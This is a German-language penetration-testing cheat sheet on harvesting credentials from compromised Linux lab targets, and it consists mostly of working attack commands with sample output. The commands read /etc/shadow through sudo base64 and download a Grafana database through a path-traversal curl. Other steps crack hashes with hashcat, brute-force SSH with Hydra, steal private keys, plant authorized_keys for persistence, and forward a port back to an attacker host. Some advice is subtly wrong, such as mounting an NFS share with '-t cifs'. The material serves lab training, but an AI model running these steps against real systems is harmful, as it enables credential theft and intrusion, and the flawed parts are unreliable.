# Credential Access

## 1. Ziel der Credential-Access Phase

- Credentials aus dem kompromittierten System extrahieren
- Benutzernamen, Passwörter, Hashes, Keys
- Für Lateral Movement
- Für Privilege Escalation
- Für Persistence
---

## 2. Relevante Techniken & Vorgehensweisen

### Credential Discovery

- Config Files durchsuchen
- Environment Variables auslesen
- Database Dumps analysieren
- History Files prüfen
- SSH Keys extrahieren

### Password Cracking

- Hash Identification
- Online Hash Cracking (hashes.com)
- Hashcat für Offline Cracking
- Custom Wordlist Generation

### Credential Harvesting aus Services

- FTP Config Files
- Web Application Configs (WordPress, LimeSurvey, Custom Apps)
- Tomcat Config (tomcat-users.xml)
- Database Credentials (MySQL, SQLite)
- NFS mounted Home Directories

---

## 3. Betriebssystem-spezifische Aspekte (Linux)

- `/etc/passwd` und `/etc/shadow` für User-Hashes
- Config Files in `/var/www/html`, `/opt`, `/etc`
- Environment Variables in Container-Umgebungen
- SSH Keys in `~/.ssh/`
- Bash History in `~/.bash_history`

---

## 4. Typische Angriffsflächen / Ansatzpunkte

### Config Files

- Web Application Configs
- Database Configs
- Service Configs (Tomcat, Apache, Nginx)
- Application-specific Configs

### Environment Variables

- Container-Umgebungen (Docker)
- System-wide ENV vars
- User-specific ENV vars

### Databases

- SQLite Databases (z.B. Grafana)
- MySQL/MariaDB Dumps
- Application Databases

### SSH Keys

- Private Keys in `~/.ssh/`
- Authorized Keys für Persistence

### History Files

- `.bash_history`
- `.mysql_history`
- Command History mit Credentials

---

## 5. Wichtige Befehle, Tools & Syntax

### Environment Variables

**Alle Environment Variables anzeigen**


```bash
env
printenv
```

**Nach Passwords suchen**


````bash
env | grep -i pass
env | grep -i pwd
env | grep -i user
```

**Beispiel Output:**
```
LIMESURVEY_PASS=5W5HN4K4GCXf9E
MYSQL_ROOT_PASSWORD=password123
DB_PASSWORD=secret
````

### Config Files

**WordPress**


```bash
cat /var/www/html/wp-config.php
```

**Custom Web App**


```bash
cat /var/www/html/academy/includes/config.php
```

**Beispiel Output:**


```php
$db_username = "root";
$db_password = "My_V3ryS3cur3_P4ss";
```

**LimeSurvey**


```bash
cat /var/www/html/survey/application/config/config.php
```

**Tomcat**


```bash
cat /opt/tomcat/conf/tomcat-users.xml
```

**Beispiel Output:**


```xml
<user username="admin" password="H2RR3rGDrbAnPxWa" roles="manager-gui"/>
<user username="robot" password="H2RR3rGDrbAnPxWa" roles="manager-script"/>
```

### FTP Credentials

**FTP Upload Directory Enumeration**


```bash
nxc ftp TARGET_IP -u anonymous -p '' --ls
nxc ftp TARGET_IP -u anonymous -p '' --ls upload
nxc ftp TARGET_IP -u anonymous -p '' --get upload/creds.txt
```

**File Download via FTP**


````bash
ftp TARGET_IP
# anonymous login
ls
cd upload
get creds.txt
exit
```

**Beispiel creds.txt:**
```
Toms Creds: tom:P@ssw0rd!
````

### SMB/Samba Credentials

**Share Enumeration**


```bash
nxc smb TARGET_IP -u tom -p 'P@ssw0rd!' --shares
```

**File Download**


```bash
smbclient "\\\\TARGET_IP\\shared" -U tom
cd IT
get new_users.txt
cd ../HR
get checkin.txt
exit
```

### NFS Mounted Home Directories

**NFS Mount**


```bash
sudo mount -t nfs TARGET_IP:/home/bob mount
```

**SSH Keys extrahieren**


```bash
ls -la mount/.ssh/
cat mount/.ssh/id_rsa
cat mount/.ssh/authorized_keys
```

### Database Credential Extraction

**SQLite (Grafana)**


````bash
# Via LFI downloaden
curl "http://TARGET_IP:3000/public/plugins/zipkin/../../../../../../../../var/lib/grafana/grafana.db" --path-as-is -o grafana.db

# Credentials extrahieren
sqlite3 grafana.db "SELECT login, password, salt FROM user;"
```

**Beispiel Output:**
```
admin|7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S
boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl
````

**MySQL/MariaDB (via Port Forward)**


```bash
# SSH Local Port Forward
ssh -L 127.0.0.1:3306:127.0.0.1:3306 alice@TARGET_IP

# Connect
mysql -h 127.0.0.1 -u wpuser -p
# Password aus Config File
```

**SQL Commands**


````sql
show databases;
use wordpress;
show tables;
select * from wp_users;
```

**Beispiel Output:**
```
+----+------------+-----------------------------------------------------------------+
| ID | user_login | user_pass                                                       |
+----+------------+-----------------------------------------------------------------+
|  1 | admin      | $wp$2y$10$fbbmL66.dhuHbBrl2sszR.xE.Ramt9QxgVzGuAyMKv/ZJFmZM9kqK |
|  2 | samuel     | 5f4dcc3b5aa765d61d8327deb882cf99                                |
+----+------------+-----------------------------------------------------------------+
````

### /etc/shadow Access (via Sudo)

**Base64 Sudo Exploitation**


````bash
LFILE=/etc/shadow
sudo base64 "$LFILE" | base64 --decode
```

**Beispiel Output:**
```
root:!:20351:0:99999:7:::
user1:$6$/nhjbu99eMQkFhgR$uayIi21nHSJ7c76tKTKFcOIYk4FT/xW4sFgASLuarJABV2biEL/Jf2ACa7AGufCp4WFvXQQ9D6fO2NkZtyb1D1:20351:0:99999:7:::
tom:$6$G2i5cNcxIeXI8gS4$rIfxMMsj9i/UvOEJlnYJjCuB1GMbMU.d6eOAm/qFDGSMfp8KWbdOa1PMP9xKXSc4qiHi2y1S51t32YP/m/e6f1:20354:0:99999:7:::
alice:$6$QxIzNV5kO2g6SYoH$lIqqbNF9p/1WeRAo46q7C3qLOvbZN99CqDb6xOYYH7ft7JFOHMNs2qtDfGpU6JeO5NlN4mxxLy/UM3FTF.bm21:20354:0:99999:7:::
````

### Hash Identification

**hash-identifier (Interactive)**


````bash
hash-identifier
# Hash eingeben wenn prompted
```

**Beispiel:**
```
HASH: cd73502828457d15655bbd7a63fb0bc8
Possible Hashs: [+] MD5
```

**Online Hash Lookup**
```
https://hashes.com
````

- Hash eingeben
- Result: Plaintext Password

### Password Cracking mit Hashcat

**Grafana Hash Conversion (Go Script)**

**convert.go:**


```go
package main

import (
    b64 "encoding/base64"
    hex "encoding/hex"
    "fmt"
)

func convertHash(username string, password string, salt string) {
    decoded_hash, _ := hex.DecodeString(password)
    hash64 := b64.StdEncoding.EncodeToString([]byte(decoded_hash))
    salt64 := b64.StdEncoding.EncodeToString([]byte(salt))
    
    fmt.Printf("# User: %s\n", username)
    fmt.Printf("sha256:10000:%s:%s\n\n", salt64, hash64)
}

func main() {
    convertHash(
        "boris",
        "dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8",
        "LCBhdtJWjl",
    )
}
```

**Ausführen:**


```bash
go run convert.go > hashes.txt
```

**Hashcat (PBKDF2-SHA256)**


````bash
hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Ergebnis:**
```
sha256:10000:TENCSGR0SldqbA==:3Gvsy7tXzU2vSk45HdIBXTNQxg3zYI6ey1KR5H8+XNOdFWviIHRb48vkk1PjXy07UdqA==:beautiful1
````

### Custom Wordlist Generation

**Bash Script für Pattern-basierte Wordlist**

**brute.sh:**


```bash
#!/bin/bash

outfile="alice_passwords.txt"
> "$outfile"

for year in $(seq 1969 2003); do
  for char in '!' '@' '#' '$' '%' '^' '&' '*'; do
    echo "alice${year}${char}" >> "$outfile"
  done
done

echo "[*] Wordlist saved to $outfile"
```

**Ausführen:**


```bash
bash brute.sh
```

**Mit Hydra verwenden:**


```bash
hydra -l alice -P alice_passwords.txt ssh://TARGET_IP -I
```

### SSH Key Discovery

**SSH Directory Enumeration**


```bash
ls -la ~/.ssh/
ls -la /home/*/.ssh/
```

**Private Key Extraction**


```bash
cat ~/.ssh/id_rsa
cat /home/bob/.ssh/id_rsa
```

**Authorized Keys**


```bash
cat ~/.ssh/authorized_keys
```

### History Files

**Bash History**


```bash
cat ~/.bash_history
cat /home/*/.bash_history
```

**MySQL History**


```bash
cat ~/.mysql_history
```

---

## 6. Reihenfolge, Abhängigkeiten & Hinweise

### Standard Credential Access Workflow

1. **Environment Variables (Quick Win)**


```bash
   env | grep -i pass
```

2. **Config Files in Common Locations**


````bash
   cat /var/www/html/*/config.php
   cat /opt/tomcat/conf/tomcat-users.xml
```

3. **Database Access (falls Port offen oder forwarded)**
   - MySQL/MariaDB
   - SQLite Files via LFI

4. **FTP/SMB Shares**
   - Anonymous Access
   - Authenticated Access mit gefundenen Creds

5. **NFS Mounts**
   - Home Directories
   - SSH Keys

6. **History Files**
   - Bash History
   - Application-specific History

7. **Hash Cracking (falls nötig)**
   - Hash Identification
   - Hashcat oder Online Tools

### Wichtige Hinweise

**Environment Variables in Containern**
- Docker Container haben oft Credentials in ENV
- Format: `SERVICE_PASSWORD=value`
- Immer `env | grep` nach Service-Namen

**Config File Locations**
```
/var/www/html/                 # Web Apps
/opt/                          # Application Installs
/etc/                          # System Configs
/usr/local/etc/                # Custom Configs
````

**Password Reuse Testing**

- Gefundene Credentials immer gegen alle Services testen
- Common Pattern: DB_PASSWORD = SSH_PASSWORD
- Tomcat Password oft = Root Password

**Database Password aus Config ermitteln**


```php
// WordPress wp-config.php
define('DB_USER', 'wpuser');
define('DB_PASSWORD', 'wppassword');

// Custom App config.php
$db_username = "root";
$db_password = "My_V3ryS3cur3_P4ss";
```

**SQLite Database Handling**


```bash
# Download via LFI
curl "http://TARGET/path/../../../../../../../../var/lib/app/database.db" --path-as-is -o database.db

# Query
sqlite3 database.db "SELECT * FROM users;"
```

**Grafana Hash Format (PBKDF2-SHA256)**

- Hash aus DB: Hex-encoded
- Salt aus DB: Base64-encoded
- Conversion nötig für Hashcat
- Hashcat Mode: 10900

**Custom Wordlists**

- Basierend auf User-Namen
- Geburtsjahre + Sonderzeichen
- Company-Namen + Jahre
- Pattern: `name+year+special`

**SSH Keys für Persistence**

- Private Keys extrahieren → für Lateral Movement
- Eigene Public Keys planten → für Persistence
- Authorized_keys Permissions: 600

**FTP/SMB Credentials in Files**

- Oft im Format: `username:password`
- Dateinamen: `creds.txt`, `passwords.txt`, `backup.txt`
- In `/upload`, `/backup`, `/shared` Directories

**MySQL Port Forwarding**


````bash
# Local Forward (von Kali)
ssh -L 127.0.0.1:3306:127.0.0.1:3306 user@TARGET

# Remote Forward (von Target)
ssh -R 127.0.0.1:3306:127.0.0.1:3306 kali@ATTACKER

# Dann lokal connecten
mysql -h 127.0.0.1 -u user -p
```

---

## 7. Typische Findings & Fehler

### Häufige Findings

**Environment Variables mit Credentials**
```
LIMESURVEY_PASS=5W5HN4K4GCXf9E
MYSQL_ROOT_PASSWORD=root123
DB_PASSWORD=secret
SSH_PASSWORD=password123
````

**Config File Credentials**


```php
// WordPress
define('DB_PASSWORD', 'wppassword');

// Custom App
$db_password = "My_V3ryS3cur3_P4ss";
```


````xml
<!-- Tomcat -->
<user username="admin" password="H2RR3rGDrbAnPxWa" roles="manager-gui"/>
```

**FTP Upload Files**
```
creds.txt:
Toms Creds: tom:P@ssw0rd!
```

**SMB Share Files**
```
new_users.txt:
New IT users: alice:alice1985!

checkin.txt:
HR Checkin: bob:bob2024!
````

**Database Dumps**


````sql
-- WordPress wp_users
admin | $wp$2y$10$hash...
samuel | 5f4dcc3b5aa765d61d8327deb882cf99  (MD5: password)
```

**SSH Keys in NFS Mounts**
```
/home/bob/.ssh/id_rsa
/home/bob/.ssh/authorized_keys
````

**Password Reuse Examples**

- Tomcat: `admin:H2RR3rGDrbAnPxWa`
- Root: `H2RR3rGDrbAnPxWa` (same password!)

### Typische Fehler

**Environment Variables nicht geprüft**

- Direkt zu Config Files gegangen
- `env | grep -i pass` vergessen
- Credentials waren in ENV

**Config File Locations nicht systematisch**


````bash
# Falsch: Nur WordPress geprüft
cat /var/www/html/wp-config.php

# Richtig: Alle Web Apps
find /var/www/html -name "config.php" -o -name "wp-config.php"
```

**Password Reuse nicht getestet**
- DB Password gefunden
- Nicht für SSH getestet
- Nicht für su root getestet

**Hash Format nicht erkannt**
```
# MD5: 32 Zeichen Hex
5f4dcc3b5aa765d61d8327deb882cf99

# SHA256: 64 Zeichen Hex
dc6becccbb57d34daf4a4e391d2015d3...

# WordPress: $wp$ Prefix
$wp$2y$10$hash...
````

**SQLite Database Query Fehler**


```bash
# Falsch: Ohne WHERE Clause bei großen DBs
sqlite3 grafana.db "SELECT * FROM user;"

# Richtig: Nur relevante Felder
sqlite3 grafana.db "SELECT login, password, salt FROM user;"
```

**Grafana Hash nicht konvertiert**

- Hash direkt in Hashcat versucht
- Go Conversion Script nicht verwendet
- Hashcat Mode falsch (-m 10900 für PBKDF2-SHA256)

**FTP/SMB Files nicht vollständig geladen**


```bash
# Falsch: Nur ein Directory geprüft
nxc ftp TARGET -u anonymous -p '' --ls

# Richtig: Alle Directories rekursiv
ftp TARGET
prompt off
recurse on
mget *
```

**SSH Keys Permissions falsch**


```bash
# Nach Extraction falsche Permissions
chmod 644 id_rsa  # Falsch
ssh -i id_rsa user@target  # Fehler: Permissions too open

# Richtig:
chmod 600 id_rsa
```

**NFS Mount: Read-Only nicht beachtet**


```bash
# Mount ohne ro Flag
mount -t nfs TARGET:/share mount

# Versucht zu schreiben
touch mount/test.txt  # Fehler

# Besser: Erst read-only
mount -t cifs TARGET:/share mount -o ro
```

**History Files ignoriert**


```bash
# .bash_history kann Credentials enthalten
cat ~/.bash_history | grep -i pass
cat ~/.bash_history | grep mysql
```

**MySQL Connection ohne Config Info**


```bash
# Falsch: Random credentials probieren
mysql -h 127.0.0.1 -u root -p

# Richtig: Erst Config File lesen
cat /var/www/html/wp-config.php
# Dann mit korrekten Credentials
mysql -h 127.0.0.1 -u wpuser -pwppassword
```
